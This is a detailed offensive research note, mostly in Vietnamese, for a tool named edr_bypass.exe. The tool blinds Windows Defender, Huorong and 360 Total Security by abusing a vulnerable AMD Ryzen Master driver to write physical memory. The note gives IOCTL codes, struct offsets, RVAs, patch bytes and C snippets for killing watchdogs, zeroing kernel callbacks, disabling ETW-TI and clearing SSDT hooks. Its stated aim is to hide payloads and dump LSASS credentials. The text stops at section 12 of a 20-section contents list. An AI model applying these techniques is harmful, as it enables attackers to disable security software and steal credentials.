# Full AV Blind Research Note
## Windows Defender + Huorong (火绒) + 360 Total Security — Kernel Callback Bypass
### Via AMD Ryzen Master BYOVD Physical Memory Primitive

**Date:** 2026-06-11  
**Build tested:** Windows 11 24H2 (Build 26200)  
**Binary:** edr_bypass.exe (252970 bytes)  
**Status:** All 7 inline tests PASS — EICAR survived, MiniDump 78MB succeeded

---

## Mục lục

1. [Tổng quan kiến trúc — Tại sao cần bypass ở tầng kernel?](#1-tổng-quan)
2. [Primitive: AMD Ryzen Master BYOVD](#2-amd-byovd-primitive)
3. [Sysdiag (Huorong) — 3 lớp vô hiệu hóa](#3-sysdiag-huorong)
4. [Module [0/8] Watchdog Kill — sysdiag](#4-module-08)
5. [Module [1/8] Watchdog Kill — IAT patch (all EDR)](#5-module-18)
6. [Module [2/8] Ps* Notify Callbacks](#6-module-28)
7. [Module [3/8] OB Callbacks](#7-module-38)
8. [Module [4/8] Minifilter Callbacks](#8-module-48)
9. [Module [5/8] ETW Threat Intelligence](#9-module-58)
10. [Module [6/8] CM Registry Callbacks](#10-module-68)
11. [Module [7/8] WFP Network Callouts](#11-module-78)
12. [Module [+/8] SSDT Hook Clear (360 Total Security)](#12-ssdt)
13. [Module [8/8] PPL Bypass (LSASS)](#13-module-88)
14. [360 Total Security — Phân tích đặc thù](#14-360-analysis)
15. [Huorong (火绒) — Phân tích đặc thù](#15-huorong-analysis)
16. [Windows Defender — Phân tích đặc thù](#16-wdefender)
17. [Tại sao Physical Memory vượt qua tất cả?](#17-why-phys)
18. [Cache Coherency — Vấn đề ít ai biết](#18-cache)
19. [Coverage Matrix — Đã blind được gì, còn gì chưa?](#19-coverage)
20. [Câu hỏi Tại sao — Sâu nhất có thể](#20-why-questions)

---

## 1. Tổng quan kiến trúc — Tại sao cần bypass ở tầng kernel?

### Câu hỏi cơ bản: AV detect malware ở đâu?

Mọi AV/EDR hiện đại đều có 2 tầng:

```
┌─────────────────────────────────────────────┐
│  USER MODE                                  │
│  ├─ MsMpEng.exe / ZhuDongFangYu.exe /       │
│  │   HipsDaemon.exe                         │
│  ├─ Signature engine (libxsse.dll, v8scan)  │
│  ├─ Cloud telemetry uplink                  │
│  └─ Response: quarantine, kill process      │
│                                             │
│  PPL-Antimalware (Protection=0x31) hoặc     │
│  service protected — không thể OpenProcess  │
└────────────────────┬────────────────────────┘
                     │ IOCTL (DeviceIoControl)
┌────────────────────▼────────────────────────┐
│  KERNEL MODE                                │
│  EDR kernel driver (.sys)                   │
│  ├─ PsSetCreate*NotifyRoutine → chặn proc   │
│  ├─ ObRegisterCallbacks → strip handle      │
│  ├─ FltRegisterFilter → chặn file I/O       │
│  ├─ CmRegisterCallback → theo dõi registry  │
│  ├─ EtwTiLog* → telemetry memory ops        │
│  └─ FwpsCalloutRegister → chặn network      │
└─────────────────────────────────────────────┘
```

**Điểm quan trọng nhất:** Tầng kernel driver làm việc **CHẶN** (blocking). Tầng user-mode chỉ làm **phát hiện và phản ứng** (detection & response). Nếu ta xóa hết callbacks ở kernel → EDR trở thành "điếc và mù" — nó không thể chặn bất kỳ thao tác nào trong thời gian thực, dù process user-mode vẫn chạy.

**Tại sao không chỉ kill process AV?**
- Windows Defender (MsMpEng.exe) là PPL-Antimalware: Protection=0x31 → `OpenProcess` bị từ chối ngay ở kernel (OB callback của WdFilter strip access rights)
- Huorong HipsDaemon.exe: không phải PPL nhưng sysdiag watchdog bảo vệ nó
- 360 ZhuDongFangYu.exe: được bảo vệ bởi OB callbacks của HipsDrv.sys

→ Phải bypass kernel trước, sau đó kill process mới được.

**Tại sao không dùng AV exclusion?**
- Exclusion paths có thể bị giám sát (CM callback thấy registry change)
- Exclusion bị revert khi AV update
- Không scale được: cần target-path biết trước

**Tại sao không dùng Safe Mode?**
- Cần reboot → noisy, visible
- WdBoot.sys (ELAM) vẫn chạy trong Safe Mode với networking

→ **Kết luận:** Phải vào kernel, tắt hết callback, rồi làm việc.

---

## 2. AMD Ryzen Master BYOVD Primitive

### 2.1 BYOVD là gì?

**BYOVD = Bring Your Own Vulnerable Driver.** Kỹ thuật: tải một driver hợp lệ (có chữ ký Microsoft) nhưng có lỗ hổng cho phép đọc/ghi bộ nhớ vật lý tùy ý, rồi dùng lỗ hổng đó để thao tác kernel.

### 2.2 AMDRyzenMasterDriverV20 — Tại sao chọn cái này?

Driver `AMDRyzenMasterDriverV20.sys` (của AMD, có chữ ký WHQL hợp lệ) expose 2 IOCTL:

```
IOCTL_PHYS_READ  0x81112F08  → đọc bộ nhớ vật lý tại địa chỉ PA bất kỳ
IOCTL_PHYS_WRITE 0x81112F0C  → ghi bộ nhớ vật lý tại địa chỉ PA bất kỳ
```

Input buffer (12 bytes, packed):
```
+0x00  uint64_t  physical_address   ← địa chỉ vật lý cần đọc/ghi
+0x08  uint32_t  byte_count         ← số byte
```

Bên trong driver gọi `MmMapIoSpace(pa, size, MmNonCached)` — ánh xạ địa chỉ vật lý vào không gian kernel VA để đọc/ghi.

**Tại sao điều này nguy hiểm?**
- Không có kiểm tra quyền: bất kỳ admin process nào cũng gọi được
- Không có whitelist/blacklist địa chỉ
- Không cần đặc quyền kernel mode
- Vượt qua TẤT CẢ software hooks: ta không đi qua `NtReadVirtualMemory`, không đi qua SSDT, không đi qua OB callbacks, không đi qua minifilter. Ta đọc thẳng vào DRAM.

**Tại sao device `\\.\AMDRyzenMasterDriverV20` mở được?**
Driver tạo device với SDDL cho phép Everyone access — thiết kế để monitoring tool của AMD (không phải driver độc quyền) có thể dùng. Đây là lỗi thiết kế, không phải tính năng.

### 2.3 Sysdiag IOCTL Primitive (Huorong)

Huorong sysdiag.sys expose thêm device `\\.\SysDiag::IOKit` với:
```
IOCTL 0x228048  → đọc kernel VA (bất kỳ địa chỉ VA)
IOCTL 0x22804C  → ghi kernel VA (qua LOCK XCHG — InterlockedExchange)
```

SDDL của device: `D:P(A;;GA;;;WD)` → Everyone có Generic All access.

**Tại sao sysdiag expose primitive này?**
Thiết kế để user-mode component (uactmon.dll) giao tiếp với kernel driver. `MmNonCached` mapping cho phép đọc VA trực tiếp, InterlockedExchange cho ghi atomic.

**Khi nào dùng sysdiag vs AMD?**
- AMD: đọc/ghi physical address (PA) → cần va_to_pa() để tìm PA từ VA
- Sysdiag: đọc/ghi virtual address (VA) trực tiếp → KHÔNG cần va_to_pa()
- Khi va_to_pa() bị hỏng (KPTI shadow CR3 issue), dùng sysdiag primitive thay thế

---

## 3. Sysdiag (Huorong) — 3 lớp vô hiệu hóa

Trước khi tắt các callback thông thường, phải xử lý sysdiag đặc biệt vì nó có **watchdog thread** theo dõi và restore callback nếu bị sửa.

### Lớp A: Watchdog Kill Switch

```c
byte_14013BDD8 = 1  (RVA 0x13BDD8 từ sysdiag base)
```

**Tại sao cái này hoạt động?**

Watchdog thread (`sub_140042380`) có vòng lặp:
```c
while (!byte_14013BDD8) {           // ← kiểm tra kill switch
    sub_14003E790();                 // kiểm tra và restore callbacks
    KeWaitForSingleObject(...);      // ngủ chờ event
}
PsTerminateSystemThread(0);          // tự kill khi byte != 0
```

Khi ta ghi `1` vào byte này qua physical memory, watchdog đang ngủ trong `KeWaitForSingleObject`. Ta cần WAKE nó dậy để nó loop lại và check kill switch → nó sẽ gọi `PsTerminateSystemThread(0)` và thoát.

**Cách wake watchdog:** Tạo noise bằng cách spawn process `cmd /c exit` 20 lần (mỗi lần cách 10ms). Mỗi process creation → PsCreateNotifyRoutine callback → sysdiag xử lý event → `KeSetEvent` wakes watchdog.

**Tại sao dùng pattern scan để tìm RVA của kill switch?**
Sysdiag có thể update version → RVA thay đổi. Thay vì hardcode 0x13BDD8, ta scan `.text` section của sysdiag tìm pattern:
```
80 3D xx xx xx xx 00  75/74 yy   → CMP byte [RIP+X], 0 ; JNZ/JZ
```
Đây là assembly của `while (!byte_kill_switch)`. RVA của byte được compute từ RIP-relative displacement.

### Lớp B: HIPS Master Disable

```c
dword_140077D88 &= ~2  (RVA 0x77D88)
```

**Tại sao cái này mạnh hơn lớp A?**

Trong `sub_140048E90` (rule checking engine), có gate:
```c
if ((dword_140077D88 & 2) == 0      // bit 1 = 0 → HIPS disabled
    || a4                            // per-call bypass
    || sub_140017780(a2))            // process exclusion
    return 0;  // NO MATCH → không block gì cả
```

Khi clear bit 1 → condition đầu tiên LUÔN true → tất cả rule checks đều return 0 → không block bất kỳ thao tác nào. Điều này có nghĩa: dù watchdog có re-activate (nếu lớp A fail), các rule vẫn không execute vì gate đã closed.

**Lớp B là safety net cho lớp A.** Cả hai cùng nhau = defense in depth từ phía ta.

### Lớp C: PID Whitelist

```c
qword_1400FE090[0] = our_pid   (RVA 0xFE090)
qword_1400FE090[1] = lsass_pid
```

**Tại sao cần whitelist khi đã có A và B?**

Trong `sub_140017780` (process exclusion check):
```c
return (a1 == qword_1400FE080);   // nếu caller là HipsDaemon → skip
```

Mảng `qword_1400FE090[0..63]` là type-A whitelist. Khi PID của ta nằm trong mảng này → `sub_140048EB7` condition ③ returns true → bypass gate → không generate event cho process của ta.

Đây là kỹ thuật **surgical bypass**: thay vì tắt toàn bộ sysdiag, ta chỉ làm sysdiag "không nhìn thấy" process của ta cụ thể. Ngay cả khi A và B fail, sysdiag vẫn không detect ta.

**Tại sao cũng whitelist LSASS?**
Sau khi ta dump LSASS memory, sysdiag sẽ xử lý WriteFile event cho dump file. Nếu LSASS PID được whitelist, các event liên quan đến LSASS cũng bị suppress.

---

## 4. Module [0/8] — Sysdiag Watchdog Kill

**Hàm:** `kill_sysdiag_watchdog()` trong `§7b`

### Bước 1: Tìm sysdiag.sys trong physical memory

```c
uint64_t sd_pa = find_driver_pa_cached("sysdiag.sys");
```

**Tại sao dùng TimeDateStamp để tìm driver?**
Driver khi load vào kernel memory, kernel có thể zero PE header (security hardening Win10 2004+). Ta không thể dùng MZ signature để tìm. Thay vào đó:
- Đọc `TimeDateStamp` từ disk PE header (file trên disk không bị zero)
- Scan toàn bộ RAM tại 4KB boundaries tìm giá trị này
- Khi match → đây là base của driver trong physical memory

**Fallback:** Nếu header bị zero → scan bằng prologue của function đã biết (đọc 16 byte đầu của function X từ disk, tìm trong RAM).

### Bước 2: Scan `.text` tìm kill switch pattern

`sd_find_ksw_rva()` scan toàn bộ `.text` section của sysdiag (mỗi page qua va_to_pa), tìm 5 pattern:
- `CMP byte [RIP+X], 0 ; JNZ/JZ`
- `TEST byte [RIP+X], 0xFF ; JNZ/JZ`
- `MOV AL, [RIP+X] ; TEST AL,AL ; JNZ/JZ`
- etc.

**Tại sao nhiều pattern?** Compiler optimize khác nhau giữa version. MSVC debug/release khác nhau. Ta cần robust với mọi version.

### Bước 3: Verify kill switch RVA

Nếu tìm thấy RVA từ pattern scan → verify bằng hardcoded 0x13BDD8:
```c
if(ksw_rva == 0x13BDD8 || fabs((double)ksw_rva/0x13BDD8 - 1.0) < 0.05)
```
Nếu gần với 0x13BDD8 (trong 5%) → confirm là đúng variable.

### Bước 4: Write + trigger + wait

```c
uint8_t v = 1;
phys_write(sd_pa + ksw_rva, &v, 1);
cache_evict_all_cores();
// spawn 20 processes để wake watchdog
```

---

## 5. Module [1/8] — Watchdog Kill (IAT Patch)

**Hàm:** `wk_apply()` trong `§6`

### Vấn đề: Tại sao cần IAT patch?

Một số EDR (sysdiag, Huorong, CrowdStrike, etc.) có **watchdog thread hoặc timer** kiểm tra định kỳ xem callback của mình có còn đăng ký không. Nếu ta zero callback → EDR re-register sau vài giây → bypass thất bại.

### Cơ chế IAT (Import Address Table)

Khi Windows load driver, nó patch IAT của driver với địa chỉ thực của các imported functions. Một indirect call trong driver code:
```asm
FF 15 XX XX XX XX    ; CALL QWORD PTR [RIP + disp32]
```
Tại runtime: `[RIP + disp32]` trỏ vào IAT entry chứa VA thực của function (ví dụ: `PsSetCreateProcessNotifyRoutine`).

### Cách tìm và patch

```c
// Scan driver code tìm pattern FF 15 [disp32]
uint64_t iat_entry_va = next_rip + sign_extend(disp32);
uint64_t iat_entry_pa = drv_pa + (iat_entry_va - drv_va);
uint64_t resolved_va  = phys_read_qword(iat_entry_pa);

// So sánh với target functions (PsSetCreate*, ObRegisterCallbacks, etc.)
if (resolved_va == target_func_va):
    // Patch 6 bytes: xor rax,rax (3b) + 3x NOP
    bytes = {0x48, 0x31, 0xC0, 0x90, 0x90, 0x90}
    phys_write(call_site_pa, bytes, 6)
```

**Tại sao `xor rax, rax; NOP×3` thay vì `RET`?**
- Các registration functions trả về `NTSTATUS` (in RAX). `STATUS_SUCCESS = 0`.
- Watchdog kiểm tra return value → nếu thấy 0 (STATUS_SUCCESS) → "ok, registration succeeded" → không retry.
- `RET` sẽ không clear RAX → giá trị rác → watchdog có thể detect failure và retry.

**Tại sao patch call site thay vì IAT entry?**
- Nếu patch IAT entry → TẤT CẢ calls đến function đó trong driver đều bị ảnh hưởng, kể cả legitimate ones
- Patch call site cụ thể chỉ ảnh hưởng đến watchdog path, không ảnh hưởng initialization

**PatchGuard safety:**
PatchGuard chỉ monitor `.text` của ntoskrnl, hal, và một số kernel components. Third-party driver `.text` KHÔNG được PG monitor → safe to patch.

---

## 6. Module [2/8] — Ps* Notify Callbacks

**Hàm:** `ps_zero()` trong `§3`

### Mục tiêu: 3 arrays trong ntoskrnl .data

| Array | Setter | Max entries | EDR use |
|-------|--------|-------------|---------|
| `PspCreateProcessNotifyRoutine[]` | `PsSetCreateProcessNotifyRoutine(Ex/Ex2)` | 64 | Chặn process creation |
| `PspLoadImageNotifyRoutine[]` | `PsSetLoadImageNotifyRoutine(Ex)` | 8 | Detect DLL injection |
| `PspCreateThreadNotifyRoutine[]` | `PsSetCreateThreadNotifyRoutine` | 64 | Detect remote thread |

### Entry format: EX_CALLBACK

```c
// Mỗi entry là một uint64_t:
NULL            → slot trống
non-null        → low 4 bits = RefCount flags
(value & ~0xF)  → VA của EX_CALLBACK_ROUTINE_BLOCK:
                    +0x00  EX_RUNDOWN_REF  RunRef
                    +0x08  PVOID           Function  ← callback thực sự
                    +0x10  PVOID           Context
```

### Cách tìm arrays

Ta không thể hardcode VA của arrays vì ASLR thay đổi mỗi boot.

**LEA scan technique:**
Export functions như `PsSetCreateProcessNotifyRoutine` phải reference array của chúng. Trong x64, instructions dùng RIP-relative addressing:
```asm
48 8D 35 XX XX XX XX    ; LEA RSI, [RIP + disp32]
                          ; → RSI = địa chỉ của PspCreateProcessNotifyRoutine
```

Ta scan 512 bytes của function body, tìm pattern `48/4C 8D [25|2D|35|3D] XX XX XX XX`, compute `target_va = rip_after_insn + disp32`, kiểm tra target có nằm trong ntoskrnl `.data` không, đọc 64 QWORDs verify format của array.

**Score-based selection:** Nhiều LEA candidates → chọn cái có score cao nhất (số entries đúng format EX_CALLBACK). Require score ≥ 3.

### Cách disable

```c
// Với mỗi non-null entry:
uint64_t entry_pa = array_pa + i * 8;
phys_write(entry_pa, &zero, 8);
```

**Tại sao safe?** Arrays nằm trong ntoskrnl `.data` (writable data section). PatchGuard chỉ protect `.text`. KHÔNG có integrity check trên Ps* notify arrays.

**Tác động:**
- Sau khi zero: không có notification nào được gửi cho EDR khi process mới được tạo, DLL load, hay thread mới.
- EDR hoàn toàn không biết payload của ta đang chạy.

---

## 7. Module [3/8] — OB Callbacks (ObRegisterCallbacks)

**Hàm:** `ob_apply_edr()` + `ob_zero_via_typelist()` trong `§4`

### Mục đích của OB callbacks

OB callbacks intercept mọi `OpenProcess`/`OpenThread`/`DuplicateHandle` call. EDR dùng PreOperation callback để **strip dangerous access rights** khỏi handle trước khi return về user-mode:

```c
// WdFilter's PreOperation callback:
info->Parameters->CreateHandleInformation.DesiredAccess &=
    ~(PROCESS_TERMINATE | PROCESS_VM_READ | PROCESS_VM_WRITE |
      PROCESS_SUSPEND_RESUME | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE);
```

Kết quả: dù malware gọi `OpenProcess(PROCESS_ALL_ACCESS, pid_of_defender)`, handle thực tế không có quyền `PROCESS_TERMINATE` → không thể kill Defender process.

### Cấu trúc `_OB_CALLBACK_ENTRY` (pool, tag 'CblE')

```
+0x000  LIST_ENTRY  CallbackList.Flink  ← links vào _OBJECT_TYPE.CallbackList
+0x008  LIST_ENTRY  CallbackList.Blink
+0x010  ULONG       Operations          1=Create, 2=Dup, 3=Both
+0x014  ULONG       Enabled             non-zero = active
+0x018  PVOID       Registration        → _CALLBACK_REGISTRATION
+0x020  POBJECT_TYPE ObjectType         → PsProcessType hoặc PsThreadType
+0x028  PVOID       PreOperation        ← ZERO THIS
+0x030  PVOID       PostOperation       ← ZERO THIS
```

### Cách tìm: Physical pool scan

Pool objects (allocated bởi `ExAllocatePoolWithTag`) nằm rải rác trong physical memory. Ta không thể dùng virtual address list (không biết VA mà không có page table walk). Thay vào đó: **scan toàn bộ RAM**.

Anchor field: `PreOperation` tại offset +0x28. Đây phải là function pointer trong một EDR driver đã biết.

9 guards để filter false positives:
1. `PreOperation` → `va_to_driver_ex()` returns non-NULL, rva < 4MB
2. `Operations` ∈ {1, 2, 3}
3. `Enabled` ≠ 0
4. `Registration` = kernel pool VA, 8-aligned, not in any module
5. `ObjectType` = kernel pool VA
6. Flink/Blink có top 16 bits = 0xFFFF
7. Flink, Blink 8-aligned
8. Không nằm trong bất kỳ loaded module nào
9. Flink ≠ Blink (list không empty)

### ob_zero_via_typelist — Fallback method

Khi pool scan không tìm được entry (ví dụ: sysdiag allocate pool không standard):

```c
// Dùng sysdiag sd_read_kva/sd_write_kva (không cần va_to_pa):
// 1. Read PsProcessType VA từ ntoskrnl exports
// 2. Đọc _OBJECT_TYPE.CallbackList.Flink qua sd_read_kva
// 3. Walk list, tìm entry có PreOperation nằm trong sysdiag range
// 4. Zero PreOperation + Enabled field
```

**Tại sao cần fallback này?**
Sysdiag allocate OB callback entries theo cách đặc biệt (TrampoLib wrappers). Pool scanner không nhận ra chúng vì VA của PreOperation không nằm trong sysdiag `.text` trực tiếp — nó nằm trong một trampoline stub. TypeList walk đi trực tiếp qua kernel linked list, bắt TẤT CẢ entries kể cả trampoline.

### Disable

```c
uint64_t zero = 0;
phys_write(entry_pa + 0x28, &zero, 8);  // null PreOperation
phys_write(entry_pa + 0x30, &zero, 8);  // null PostOperation
```

**Tại sao null-check an toàn?**

Kernel dispatch code trong `ObpCallPreOperationCallbacks`:
```c
for (e = head->Flink; e != head; e = e->Flink) {
    cb = CONTAINING_RECORD(e, OB_CALLBACK_ENTRY, CallbackList);
    if (cb->PreOperation != NULL)   // ← null check TRƯỚC khi call
        cb->PreOperation(cb->Registration, &opInfo);
}
```

Null callback → được skip không có exception. Safe hoàn toàn.

---

## 8. Module [4/8] — Minifilter Callbacks (FltRegisterFilter)

**Hàm:** `flt_apply_edr()` trong `§5`

### Mục đích

Minifilter intercept file I/O operations hệ thống: `IRP_MJ_CREATE`, `IRP_MJ_WRITE`, `IRP_MJ_SET_INFORMATION` (rename/delete), etc. AV dùng để:
- **On-access scanning:** quét file khi mở
- **Ransomware detection:** phát hiện pattern ghi file hàng loạt
- **Block malicious files:** từ chối create/write cho file nguy hiểm

### Cấu trúc `_CALLBACK_NODE` (trong fltmgr.sys, không phải pool)

```
+0x000  LIST_ENTRY  CallbackLinks
+0x010  _FLT_FILTER* Filter     ← pool VA, không nằm trong module image
+0x018  PreOperation    (Win10 1903-21H2)
+0x020  PostOperation
--- hoặc ---
+0x020  PreOperation    (Win10 2004 – Win11 23H2)
+0x028  PostOperation
--- hoặc ---
+0x028  PreOperation    (Win11 24H2+)    ← BUILD 26200
+0x030  PostOperation
```

**Tại sao offset thay đổi?** Microsoft thêm fields mới vào struct qua các version. Ta scan với cả 3 possible offsets.

### Cách tìm

Pool scan tương tự OB, nhưng anchor là `PreOperation`. 7 guards:
1. PreOperation trong EDR driver, RVA < 4MB
2. Filter là pool VA (not in any module)
3. `_FLT_FILTER*` còn trỏ về pool hợp lệ
4. Flink/Blink là pool VA
5. GUID kiểm tra (Filter registration có unique GUID)
6. CallbackLinks 8-aligned
7. PreOperation không trỏ vào fltmgr.sys (system only)

**Grouping:** sau scan, group các nodes có cùng `_FLT_FILTER*` → thuộc cùng 1 EDR driver.

### 4 methods bypass, tùy trường hợp

**Method A (LIST_ENTRY unlink):** Dùng va_to_pa để tìm PA của Flink/Blink trong linked list của fltmgr, sau đó unlink node khỏi list. Sau khi unlink, fltmgr không thể reach callback nữa.
- Yêu cầu: va_to_pa() hoạt động
- Ưu điểm: clean, không cần patch code

**Method A.6 (Pool data redirect — không cần va_to_pa):** Redirect PreOperation function pointer tại struct+offset đến một stub `xor eax,eax; ret` đã tìm trước trong ntoskrnl.
- Không cần va_to_pa
- Làm việc ngay cả khi KPTI shadow CR3 issue
- **Đây là method được dùng cho sysdiag** vì va_to_pa bị hỏng trên máy test

**Method B.1 (Code patch với va_to_pa):** Patch function bytes của PreOperation thành `31 C0 C3` (xor eax,eax; ret).

**Method B.2 (Prologue scan — không cần va_to_pa):** Scan physical memory tìm byte pattern của function prologue, patch trực tiếp.

**Tại sao `xor eax,eax; ret` (3 bytes)?**
- `31 C0` = xor eax, eax → RAX = 0 = `FLT_PREOP_SUCCESS_NO_CALLBACK`
- `C3` = ret
- `FLT_PREOP_SUCCESS_NO_CALLBACK = 0`: fltmgr pass IRP xuống stack mà không process, không invoke PostOperation
- An toàn: fltmgr LUÔN check return value → không BSOD

---

## 9. Module [5/8] — ETW Threat Intelligence

**Hàm:** `etw_patch_funcs()` (Method A) + `etw_disable_provider()` (Method B)

### ETW-TI là gì?

ETW (Event Tracing for Windows) Threat Intelligence provider là một **kernel-mode ETW provider đặc biệt** emits events về sensitive kernel operations. Đặc điểm:
- Provider GUID: `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`
- Events được gửi **SYNCHRONOUSLY** — blocking call trước khi operation complete
- EDR nhận events để detect: process injection, credential theft, etc.

Functions liên quan:

| Function | Triggered bởi |
|----------|---------------|
| EtwTiLogReadWriteVm | NtReadVirtualMemory / NtWriteVirtualMemory |
| EtwTiLogAllocExecVm | NtAllocateVirtualMemory + executable |
| EtwTiLogMapExecView | NtMapViewOfSection + executable |
| EtwTiLogSetContextThread | NtSetContextThread (thread hijacking) |
| EtwTiLogOpenProcess | NtOpenProcess (Win11 22H2+) |

### Method A: Code patch (PatchGuard-risky)

Patch 3 bytes đầu của mỗi `EtwTiLog*` function:
```asm
; Original:
40 53 push rbx
48 83 EC sub rsp, ...

; Patched:
31 C0 C3    xor eax, eax; ret
```

**Tại sao risky?** Các functions này nằm trong ntoskrnl `.text`. PatchGuard monitor `.text` của ntoskrnl. PG có thể trigger BSOD sau ~5-10 phút.

**Tại sao vẫn dùng?** Trong window 5-10 phút đó, mọi thao tác memory đều không được report. Đủ để complete operation rồi restore.

### Method B: Provider disable (PatchGuard-safe)

Thay vì patch code, ta tìm `_ETW_GUID_ENTRY` pool object và zero `IsEnabled`:

```
_ETW_GUID_ENTRY layout (pool object):
+0x000  LIST_ENTRY   GuidList
+0x010  LIST_ENTRY   SiloList
+0x020  INT64        RefCount
+0x028  GUID         Guid         ← scan target: ETW_TI_GUID bytes
+0x038  PVOID        SecurityDescriptor
+0x040  LIST_ENTRY   RegListHead
+0x050  EX_PUSH_LOCK Lock
+0x058  _ETW_PROVIDER_ENABLE_INFO:
            +0x000 ULONG  IsEnabled   ← ZERO THIS
            +0x004 UCHAR  Level
            +0x008 ULONG64 MatchAnyKeyword
```

Scan physical memory tìm 16-byte ETW_TI_GUID pattern. Khi IsEnabled = 0 → provider báo cho kernel không emit events. Cách này chỉ modify **pool data**, không touch code → PatchGuard safe.

**Tại sao cần cả 2 methods?** Method A không available trên builds không export EtwTiLog*. Method B không available nếu GUID không tìm được. Kết hợp cả 2 đảm bảo ít nhất 1 hoạt động.

---

## 10. Module [6/8] — CM Registry Callbacks

**Hàm:** `cm_apply_edr()` trong `§6 CM`

### Mục đích

`CmRegisterCallbackEx` cho phép driver monitor TẤT CẢ registry operations system-wide. EDR dùng để:
- Detect service installation (`HKLM\SYSTEM\CurrentControlSet\Services\*`)
- Detect IFEO hijacking (`HKLM\...\Image File Execution Options`)
- Detect persistence (`HKCU\...\Run\`)
- Protect own registry keys (tự bảo vệ config)

### Cấu trúc `_CM_NOTIFY_ENTRY` (pool, tag 'cmNE')

```
+0x000  LIST_ENTRY      ListEntry      ← links vào ntoskrnl global list
+0x010  UNICODE_STRING  Altitude
            +0x010 Length    USHORT (2-40, even)
            +0x012 MaxLength (= Length + 2)
            +0x018 Buffer    PWSTR kernel VA
+0x020  PVOID           Context
+0x028  PVOID           Function       ← ZERO THIS
+0x030  LARGE_INTEGER   Cookie         (unregister handle, non-zero)
+0x038  PVOID           Driver         (pool: PDRIVER_OBJECT)
```

**Discriminator mạnh nhất:** Altitude string là decimal number (e.g., "320000" = length 12). Kết hợp với Length ∈ [2,40] (even), MaxLength = Length+2, Buffer là kernel VA → false positive rate cực thấp.

**Disable:**
```c
uint64_t zero = 0;
phys_write(entry_pa + 0x28, &zero, 8);  // null Function
```

ntoskrnl null-check Function trước khi call → safe.

---

## 11. Module [7/8] — WFP Network Callouts

**Hàm:** `wfp_apply_edr()` trong `§7`

### WFP là gì?

Windows Filtering Platform — kernel networking subsystem cho phép drivers register callouts để inspect/modify/block network traffic. Layers quan trọng:
- `FWPS_LAYER_ALE_AUTH_CONNECT_V4` — cho phép/từ chối TCP connections
- `FWPS_LAYER_STREAM_V4` — inspect TCP payload (DPI)
- `FWPS_LAYER_ALE_FLOW_ESTABLISHED_V4` — flow tracking

Huorong hrwfpdrv.sys dùng để:
- DPI signatures tìm Log4Shell/JNDI, Node.js RCE, multipart upload
- Block outbound connections đến C2 infrastructure
- HTTP response injection (ad blocker)

360 netmon.sys dùng để block network-based attacks.

### Cấu trúc `_FWPS_CALLOUT` (pool, tag 'WfpC')

```
+0x000  LIST_ENTRY  list
+0x010  GUID        calloutKey      ← Data1 non-zero
+0x020  UINT32      flags
+0x024  UINT32      calloutId       ← non-zero
+0x028  PVOID       classifyFn      ← anchor, ZERO THIS
+0x030  PVOID       notifyFn        ← ZERO THIS
+0x038  PVOID       flowDeleteFn    ← optional
```

**Disable:** Zero classifyFn và notifyFn. WFP engine null-check trước khi call.

**Tại sao không cần restore WFP cho EICAR test?** EICAR test chỉ drop file, không có network I/O. WFP bypass quan trọng cho C2 callbacks, lateral movement, DNS-based detection.

---

## 12. Module [+/8] — SSDT Hook Clear (360 Total Security đặc thù)

**Hàm:** `ssdt_scan()` + `ssdt_apply()` trong `§7c` — **MỚI THÊM SESSION NÀY**

### SSDT là gì?

**System Service Descriptor Table** (`KiServiceTable`): bảng map syscall number → function address trong kernel. Khi user-mode gọi syscall:
```
user: syscall (NT_OPENPROCESS = 0x26)
→ kernel: KiSystemServiceUser → KiServiceTable[0x26] → NtOpenProcess()
```

### Tại sao 360 có thể hook SSDT trên x64 mà không BSOD?

Trên x64 Windows, **PatchGuard** monitor KiServiceTable và BSOD nếu phát hiện modification. Nhưng 360 Total Security (HipsDrv.sys) **bypass PatchGuard chính nó** trước:
1. Locate PatchGuard's `KTIMER` objects (DPC timers) trong kernel memory
2. Disable Enabled flag → PG verification timers không fire
3. Sau khi PG disabled → freely modify KiServiceTable

**Kết quả:** Ngay cả sau khi ta xóa hết OB/FLT/CM callbacks, 360's SSDT hooks vẫn còn hoạt động. Mọi standard usermode code gọi NtOpenProcess đều bị hook.

### Tại sao AMD primitive của ta bypass SSDT hooks?

```
Khi ta gọi:    AMD driver IOCTL → MmMapIoSpace() → đọc/ghi DRAM
SSDT hook:     chỉ activate khi code đi qua KiSystemServiceUser syscall path
               AMD IRP handler ở ring-0, không đi qua user→kernel transition
               → SSDT hooks KHÔNG bao giờ được invoke
```

**Nhưng:** Nếu ta inject shellcode vào process khác và shellcode đó gọi `NtOpenProcess`/`NtReadVirtualMemory` → vẫn bị hook. SSDT clearing cần thiết cho payloads dùng standard API.

### Cách detect hooks

```c
// 1. Find KiServiceTable VA from KeServiceDescriptorTable export
uint32_t ksdt_rva = pe_export_rva(g_nt_pe, g_nt_pe_sz, "KeServiceDescriptorTable");
uint64_t ksdt_pa = g_nt_pa + ksdt_rva;
uint64_t kst_va  = phys_read_qword(ksdt_pa + 0x00);  // KSERVICE_TABLE_DESCRIPTOR.Base
uint32_t limit   = phys_read_dword(ksdt_pa + 0x10);  // KSERVICE_TABLE_DESCRIPTOR.Limit

// 2. Read live table
uint32_t *live = phys_read(kst_pa, limit * 4);

// 3. Read disk table with proper RVA→file-offset
uint32_t kst_foff = rva_to_foff(g_nt_pe, g_nt_pe_sz, kst_rva);
uint32_t *disk    = (uint32_t*)(g_nt_pe + kst_foff);

// 4. Compare
for (i in 0..limit):
    if (live[i] != disk[i]):  // hook found!
```

### Tại sao so sánh disk vs memory an toàn?

KiServiceTable entries là **relative offsets** từ KiServiceTable base:
```
entry[i] = encode(fn_va - kst_va)
decode:    fn_va = kst_va + ((int32_t)entry[i] >> 4)
```

Vì entries là relative (không phải absolute), khi kernel load với ASLR (image rebased), `fn_va - kst_va` không đổi → disk values = loaded values (trước khi hook). Không cần lo về relocation.

### Tại sao rva_to_foff() thay vì dùng RVA trực tiếp?

ntoskrnl.exe có thể có `FileAlignment (0x200) != SectionAlignment (0x1000)`. Nếu dùng `g_nt_pe + kst_rva` trực tiếp → đọc nhầm padding. `rva_to_foff()` convert đúng:

```c
// Với section có VirtualAddress=0x1000, PointerToRawData=0x400:
// RVA 0x1100 → file offset = 0x400 + (0x1100 - 0x1000) = 0x500
file_offset = section.PointerToRawData + (rva - section.VirtualAddress)
```

### Restore và PatchGuard safety

Sau khi ta write back disk values (correct values) → PatchGuard's next verification scan sẽ thấy KiServiceTable CORRECT → không BSOD. Ta đang "fix" violation của 360, không tạo violation mới.

